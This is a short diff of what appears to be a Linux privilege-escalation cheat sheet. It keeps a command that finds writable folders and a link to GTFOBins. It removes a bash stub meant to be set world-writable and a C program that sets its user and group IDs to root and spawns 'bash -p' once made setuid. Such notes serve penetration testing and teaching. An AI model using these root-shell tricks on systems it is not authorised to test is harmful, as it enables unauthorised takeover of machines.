@@ -102,26 +102,6 @@ Find writeble folders
 $ find / -writable 2>/dev/null |cut -d "/" -f 2 | sort -u
 ```
 
-```console
-#!/bin/bash
-/bin/bash
-```
-Set chmod 777
-
-```c
-#Spawn Bash C
-#include <stdio.h>
-#include <stdlib.h>
-#include <unistd.h>
-int main (void) {
-        setuid(0);
-        setgid(0);
-        system("/bin/bash -p");
-        return 0;
-}
-```
-set chmod x+s
-
 ## SUID
 
 Compare executables with [GTFOBins](https://gtfobins.github.io/)
